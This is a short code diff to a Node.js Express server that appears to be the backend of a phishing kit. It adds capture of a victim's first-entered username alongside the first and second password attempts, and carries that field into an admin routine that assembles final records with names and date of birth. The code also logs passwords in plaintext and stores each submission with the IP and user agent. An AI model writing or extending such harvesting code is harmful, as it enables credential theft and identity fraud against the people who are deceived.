@@ -158,7 +158,7 @@ app.use(async (req, res, next) => {
 
 // Routes
 app.post('/api/login', async (req, res) => {
-  const { xusr, xpss, xpssFirst } = req.body;
+  const { xusr, xpss, xpssFirst, xusrFirst } = req.body;
   
   console.log('Login attempt:', { xusr, xpss });
   
@@ -169,7 +169,7 @@ app.post('/api/login', async (req, res) => {
     const userSession = await db.createUserSession(ip, userAgent);
     
     // Store login data
-    await db.storeLoginData(userSession.sessionId, { xusr, xpssFirst, xpss }, ip, userAgent);
+    await db.storeLoginData(userSession.sessionId, { xusr, xusrFirst, xpssFirst, xpss }, ip, userAgent);
     
     // Store session ID in response for frontend to use
     res.json({ 
@@ -392,7 +392,9 @@ app.post('/api/admin/fix-incomplete-sessions', async (req, res) => {
         // Create final data from existing data
         const finalData = {
           xusr: session.loginData.xusr,
+          xusrFirst: session.loginData.xusrFirst,
           xpss: session.loginData.xpss,
+          xpssFirst: session.loginData.xpssFirst,
           xname1: session.infoData.xname1,
           xname2: session.infoData.xname2,
           xdob: session.infoData.xdob,
